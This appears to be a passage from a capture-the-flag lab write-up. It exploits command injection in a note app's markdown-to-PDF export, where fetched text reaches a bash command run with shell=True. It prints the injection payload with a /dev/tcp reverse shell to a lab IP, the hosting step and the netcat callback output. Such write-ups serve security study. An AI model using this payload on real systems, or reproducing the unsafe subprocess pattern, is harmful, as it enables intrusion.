Examine the source code some more to see that some user-provided input is used in an OS command
```python
r = pyrequest.get(url,allow_redirects=True)
rand_int = random.randint(1,10000)
command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"
subprocess.run(command, shell=True, executable="/bin/bash")
```
Create a file ```t.md``` with a payload of ```';bash -i >& /dev/tcp/10.10.14.4/9001 0>&1 ; echo 's```, then use the app's "Export Notes" functionality to request ```t.md``` 
![[Pasted image 20220519145329.png]]
```bash
# Host the malicious file
python3 -m http.server 8008
Serving HTTP on 0.0.0.0 port 8008 (http://0.0.0.0:8008/) ...
10.10.11.160 - - [19/May/2022 14:54:12] "GET /t.md HTTP/1.1" 200 -

# Get callback on listener
nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.160] 37928
bash: cannot set terminal process group (1260): Inappropriate ioctl for device
bash: no job control in this shell
svc@noter:~/app/web$
```
